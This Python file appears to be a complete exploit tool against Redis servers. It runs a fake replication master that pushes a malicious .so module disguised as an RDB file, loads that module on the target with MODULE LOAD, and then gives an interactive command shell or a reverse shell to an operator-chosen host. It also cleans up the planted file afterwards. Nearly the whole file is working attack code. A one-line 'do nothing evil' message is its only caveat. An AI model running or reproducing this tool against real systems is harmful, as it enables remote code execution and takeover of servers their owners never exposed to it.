import socket
import argparse
from argparse import RawTextHelpFormatter
from random import getrandbits
from os import path
from time import sleep
import chardet
import re

CRLF = "\r\n"
MODULE_NAME = "RedisRuntime"
MODULE_EXEC = "RedisRuntime.exec"
MODULE_REV = "RedisRuntime.rev"


def getrandhex(length: int) -> str:
    return "%x" % getrandbits(4 * length)


class RogueServer:

    def __init__(self, port, so_path, **kwargs):
        self.port = port
        self.path = so_path
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind(("0.0.0.0", self.port))
        self.sock.listen(5)  # TCP port max concurrent
        self.stage = 0
        self.verbose_flag = kwargs.get("verbose") if "verbose" in kwargs else False
        self.conne_record = {}

    def master_rep(self, locally=True, timeout=3):
        """

        :param locally: Whether with client start up together locally or not
        """
        if not locally:  # Only server mod
            print("[*] Listening on port: {port}".format(port=self.port))

        while True:
            try:
                client, addr = self.sock.accept()
                self.stage = 0
                print("[+] Accept connection from {}:{}".format(addr[0], addr[1]))
                if addr[0] not in self.conne_record:
                    self.conne_record[addr[0]] = 1
                else:
                    self.conne_record[addr[0]] += 1
                    if self.conne_record[addr[0]] % 10 == 0:
                        print("[+] Accept connection from {} {} times, "
                              "maybe in a wrong way if doesn't work yet. You should consider "
                              "run `SLAVEOF NO ONE` command in target.".format(addr[0], self.conne_record.get(addr[0])))
                try:
                    while True:
                        data = client.recv(1024)
                        self.verbose_down(data)
                        if b"PING" in data:  # Handshake
                            payload = ("+PONG" + CRLF).encode()
                            self.stage = 1
                        elif b"listening-port" in data:  # replication conf - listening-port
                            payload = ("+OK" + CRLF).encode()
                            self.stage = 2
                        elif b"capa" in data:  # replication conf - capacity
                            payload = ("+OK" + CRLF).encode()
                            self.stage = 3
                        elif b"PSYNC" in data:  # SYNC request
                            self.stage = 4
                            with open(self.path, "rb") as so_file:
                                so_stream = so_file.read()
                                # full replication response
                                payload = b"+FULLRESYNC " + getrandhex(40).encode() + b" 1" + CRLF.encode()
                                # The evil .so file pretending to be a RDB file, which will save by target
                                payload += b'$' + str(
                                    len(so_stream)).encode() + CRLF.encode() + so_stream + CRLF.encode()
                        elif locally:
                            return False
                        else:
                            break
                        self.verbose_up(payload)
                        client.send(payload)
                        if self.stage == 4:
                            if locally:
                                print("[*] The Rogue Server Finished Sending the Fake Master Response.")
                                return True
                            break
                except KeyboardInterrupt:
                    if not locally:
                        print("[!] Rogue Server close on port {port}".format(port=self.port))
                        self.sock.close()
                        return False
                finally:
                    if self.stage == 4:
                        print("[*] Wait for redis IO and trans flow close...")
                        sleep(timeout)
                    if client:
                        client.close()
                    if locally:
                        self.sock.close()
            except Exception as e:
                print("[-] Cancel listening.")
                print("[-] Reason:", str(e))
                break
        if self.sock:
            self.sock.close()

    def verbose_up(self, data: bytes):
        if not self.verbose_flag:
            return
        if data:
            print("[<<]", end="")
            print(data[:100] + (b"..." if len(data) > 100 else b""))

    def verbose_down(self, data: bytes):
        if not self.verbose_flag:
            return
        if data:
            print("[>>]", end="")
            print(data[:100] + (b"..." if len(data) > 100 else b""))

    def close(self):
        if self.sock:
            self.sock.close()

    def verbose(self, flag: bool):
        self.verbose_flag = flag


class RunServer:
    def __init__(self, rhost, lhost, rport=6379, lport=15000, passwd=None, **kwargs):
        import hashlib
        self.remote = RedisCli(rhost, rport=rport)
        self.passwd = passwd
        self.rogue_ip = lhost
        self.rogue_port = lport
        self.db_dir = None if "try_dir" not in kwargs else kwargs.get("try_dir")
        # self.try_dir = False if "try_dir" in kwargs else kwargs.get("try_dir")
        self.try_dir_list = ["/tmp"]
        self.db_name = None

        rhost_md5 = hashlib.md5()
        rhost_md5.update(rhost.encode())
        self.so_name = "temp-%s.rdb" % rhost_md5.hexdigest()[:6]

    def init_connect(self):
        print("[*] Init connection...")
        if self.passwd is not None:
            if not self.remote.res_correct("AUTH {passwd}".format(passwd=self.passwd)):
                print("[-] Password error.")
                return False
        self.remote.send("info server")
        server_info = self.remote.recv()
        if "redis_version" not in server_info:
            print("[!] Target may not be vulnerable.")
            print("[*] Response:", server_info)
            return False
        if not self.db_dir:
            self.get_dir_list(server_info)
        print("[+] Target accessible!")
        return True

    def get_dir_list(self, server_info: str):
        """
        # Incase of other redis_unauth_attack has changed the dir(eg. /etc/cron.d)
        # we need to find the correct path we can write
        # /tmp is nice and config_file or executable dir maybe we can write a RDB file
        # In `info server`
        # config_file:/xxx/redis/redis.config
        # we try to set: CONFIG SET dir /xxx/redis/
        """
        rex_list = ["config_file:(.*?)/redis.conf",
                    "executable:(.*?)/redis-server"]
        for rex in rex_list:
            _dir = re.findall(rex, server_info)
            if len(_dir):
                self.try_dir_list.append(_dir[0])

    def exp_1(self):
        """
        RunServer Step-1
        """
        print("[*] Exploit Step-1.")
        # Get path and name of the db file
        self.remote.send("CONFIG GET dir")
        res = self.remote.recv().strip(CRLF)
        if len(res) and res[0] == "-":
            print("[!] Target can't exec redis command.")
            print("[*] Target redis response:", res)
            return False
        if not self.db_dir:
            self.db_dir = res.split(CRLF)[-1]
        else:
            self.remote.response("CONFIG SET dir {}".format(self.db_dir))
        print("[+] RDB dir: {}".format(self.db_dir))
        self.remote.send("CONFIG GET dbfilename")
        self.db_name = self.remote.recv().strip(CRLF).split(CRLF)[-1]
        # Set target to be the slave of our rogue server and
        # switch dbfilename to dump.so
        _f, _i = self.remote.exec_by_oder(
            ["SLAVEOF NO ONE",
             "SLAVEOF {rogue_ip} {rogue_port}".format(rogue_ip=self.rogue_ip, rogue_port=self.rogue_port),
             "CONFIG SET dbfilename {so_name}".format(so_name=self.so_name)])
        print("[*] Done.")
        return _f

    def exp_2(self):
        """
        RunServer Step-2
        """
        print("[*] Exploit Step-2.")
        _f, _i = self.remote.exec_by_oder(
            ["SLAVEOF NO ONE",
             "MODULE LOAD {so_path}".format(so_path=self.db_dir + "/" + self.so_name)
             ])
        print("[*] Done.")
        return _f

    def exec(self, command):
        return self.remote.response([MODULE_EXEC, "{cmd}".format(cmd=command)]).strip(CRLF).split(CRLF)[-1]

    def response(self, command):
        return self.remote.response(command).strip(CRLF).split(CRLF)[-1]

    def clean(self):
        print("[*] Plz wait for auto exit. Cleaning.... ")
        print("[!] DO NOT SHUTDOWN IMMEDIATELY!")
        self.remote.exec_by_oder(
            ["CONFIG SET dbfilename {raw_rdb}".format(raw_rdb=self.db_name),
             [MODULE_EXEC, " rm -f {so_name}".format(so_name=self.db_dir + "/" + self.so_name)],
             "MODULE UNLOAD {module_name}".format(module_name=MODULE_NAME)
             ],
            mode="lose"
        )
        print("[*] Done.")


class RedisCli:

    def __init__(self, rhost, rport=6379):
        self.host = rhost
        self.port = rport
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # TCP
        try:
            self.sock.connect((self.host, self.port))
        except TimeoutError:
            print("[-] Target unreachable.")
        except Exception as e:
            raise e

    def send(self, data):
        self.sock.send(self.redis_encode(data))

    def recv(self, size=None, **kwargs):
        maxsize = 65535
        if size:
            return self.redis_decode(self.sock.recv(size))
        else:
            recv_bytes = b""
            t = 1
            raw_data_len = 0
            current_len = 0
            continue_recv_flag = False
            other_size = 0
            while True:
                data = self.sock.recv(maxsize)
                if len(data):
                    if data[0] == ord(b"$"):
                        CRLF_index = data.find(CRLF.encode())
                        raw_data_len = int(data[1:CRLF_index])
                        continue_recv_flag = True
                        recv_bytes += data[CRLF_index + len(CRLF):]
                        current_len += len(data)
                        other_size = 2 * len(CRLF) + CRLF_index
                    else:
                        recv_bytes += data
                        current_len += len(data)
                        if not continue_recv_flag and (not data or len(data) < maxsize):
                            break
                    if current_len >= raw_data_len + other_size:
                        break

                t += 1

            return self.redis_decode(recv_bytes)

    def response(self, data, **kwargs):
        self.send(data)
        return self.recv(**kwargs)

    def res_correct(self, data, **kwargs):
        res = self.response(data, **kwargs)
        if len(res) and res[0] not in "-":
            return True
        if "verbose" in kwargs and kwargs.get("verbose"):
            print("[-] Err response:", res)
        return False

    def exec_by_oder(self, command_list: list, mode="strict") -> tuple:
        res_flag = True
        for i in range(len(command_list)):
            if self.res_correct(command_list[i], verbose=True) is False:
                desc_str = command_list[i]
                if isinstance(command_list[i], list):
                    desc_str = " ".join(command_list[i])
                    print("[-] Command exec failed:", desc_str)
                if mode == "strict":
                    return False, i
                res_flag = False
        return res_flag, -1

    @staticmethod
    def redis_encode(data: str) -> bytes:
        assert isinstance(data, str) or isinstance(data, list), "Redis_encode expect list or str, got %s" % type(data)
        if isinstance(data, str):
            data = data.strip().split()
        send_stream = ""
        send_stream += "*" + str(len(data))
        for arg in data:
            send_stream += CRLF + "$" + str(len(arg))
            send_stream += CRLF + arg
        send_stream += CRLF
        return send_stream.encode()  # utf-8

    @staticmethod
    def redis_decode(recv_bytes: bytes) -> str:
        encode = chardet.detect(recv_bytes).get("encoding")
        # print(encode)
        if encode:
            return recv_bytes.decode(encode, errors='ignore')
        return recv_bytes.decode(errors='ignore')


class RedisRogueServer:

    def __init__(self, rhost=None, lhost=None, rport=6389, lport=6389, args=None, **kwargs):
        # Called locally
        if args is not None:
            self.only_server = False
            self.clean_flag = False
            self.args = args
            self.path = args.so_path if args.so_path else "module.so"
            self.rogueServer = None
            self.try_other_dir = True if "try_dir" in kwargs else False

            if args.separate:  # Rogue Server listen port remotely
                print("[*] Separate Mode. Plz insure your Rogue Server are listening.")
            else:
                self.rogueServer = RogueServer(args.lport, self.path, verbose=args.verbose)
            if args.rhost is None or args.lhost is None:  # Only Rogue Server
                self.only_server = True
                return
            if not path.exists(self.path):
                raise FileNotFoundError(".so file Not Found: " + self.path)

            self.target = RunServer(rhost=args.rhost,
                                    rport=args.rport,
                                    lhost=args.lhost,
                                    lport=args.lport,
                                    passwd=args.passwd,
                                    **kwargs)
        else:  # API
            pass

    def exp(self):
        if self.only_server:
            self.rogueServer.master_rep(locally=False)
            return
            # Init connection && Test executable
        if not (self.target.init_connect() and self.target.exp_1()):
            return
        self.clean_flag = True

        if self.rogueServer:
            # Wait for the rogue server responses
            if not self.rogueServer.master_rep(timeout=self.args.rtimeout):
                print("[-] Exploit Step-1 failed")
        else:
            # If Rogue Server not listening locally, then sleep a few secs
            self.wait(self.args.rtimeout)

        if not self.target.exp_2():
            print("[-] Exploit Step-2 failed")
            if self.try_other_dir:
                return
            _try = input("[?] If u got a module load error, you should try another dir(auto detect).[Y/n]")
            if not _try or _try.lower() not in "no":
                self.try_other_dir = True
                return
        self.try_other_dir = False
        print("[+] It may crash target redis cause transfer large data, be careful.")
        shell_type = input("[?] Shell? [i]interactive,[r]reverse:")
        print("[!] DO NOT USING THIS TOOL DO ANYTHING EVIL!")
        if shell_type.lower() == "r":
            ip = input("[+] IP: ")
            port = input("[+] Port: ")
            return self.target.response([MODULE_REV, "{ip}".format(ip=ip), " {port}".format(port=port)])
        else:
            self.try_other_dir = False
            print("[+] =========================== Shell ============================= ")
            while True:
                cmd = input("$ ")
                if cmd.lower() == "exit":
                    if self.rogueServer:
                        self.rogueServer.close()
                    return
                elif len(cmd.strip()) == 0:
                    continue
                res = self.target.exec(cmd)
                print(res)

    def clean(self):
        self.target.clean()

    def wait(self, sec=3):
        print("[*] Wait {} secs for REMOTE Rogue Server response.(Use flag -t [N] to change timeout)".format(sec))
        print("[!] Make sure your remote Rogue Server is working now!")
        sleep(sec)
        return True


def args_parse():
    parser = argparse.ArgumentParser(prog="redis_rogue_server.py",
                                     usage="python3 redis_rogue_server.py -rhost [target_ip] -lhost [rogue_ip] [Extend options]",
                                     description=""" Redis unauthentication test tool.""",
                                     epilog="Example: \n  redis_rogue_server.py -rhost 192.168.0.1 -lhost 192.168.0.2"
                                            "\n  redis_rogue_server.py -rhost 192.168.0.1 -lhost 192.168.0.2 -rport 6379 -lport 15000"
                                            "\n\nOnly Rogue Server Mode: "
                                            "\n  redis_rogue_server.py -v ",
                                     formatter_class=RawTextHelpFormatter)
    parser.add_argument("-rhost", dest="rhost", help="Target host.")
    parser.add_argument("-rport", dest="rport", type=int,
                        help="Target port. [default: 6379]", default=6379)
    parser.add_argument("-lhost", dest="lhost",
                        help="Rogue redis server, which target host can reach it.\n"
                             "THIS IP MUST BE ACCESSIBLE BY TARGET!")
    parser.add_argument("-lport", dest="lport", type=int,
                        help="Rogue redis server listen port. [default: 15000]", default=15000)
    parser.add_argument("-passwd", dest="passwd",
                        help="Target redis password.")
    parser.add_argument("-path", dest="so_path",
                        help="\"Evil\" so path. [default: module.so]")
    parser.add_argument("-t", dest="rtimeout", type=int, default=3,
                        help="Rogue server response timeout. [default: 3]")
    parser.add_argument("-s", dest="separate", action="store_true",
                        help="Separate mod.\n"
                             "Whether Redis-Cli(This ip) and rogue Server(Can be other ip) are separated\n"
                             "rogue Server port listens locally by default, use flag -s shut down local port if lport conflict.")
    parser.add_argument("-v", dest="verbose", action="store_true", help="Verbose Mode.")

    args = parser.parse_args()
    return args


if __name__ == "__main__":
    args = args_parse()
    exploit = None
    try:
        exploit = RedisRogueServer(args=args)
        exploit.exp()
        if exploit.try_other_dir and len(exploit.target.try_dir_list):
            for _dir in exploit.target.try_dir_list:
                print("[+] Trying dir:", _dir)
                exploit = RedisRogueServer(args=args, try_dir=_dir)
                exploit.exp()
                if exploit.try_other_dir is False:
                    break
    except KeyboardInterrupt:
        pass
    except Exception as e:
        # print("[-]", str(e))
        raise e
    finally:
        if exploit and exploit.clean_flag:
            exploit.clean()
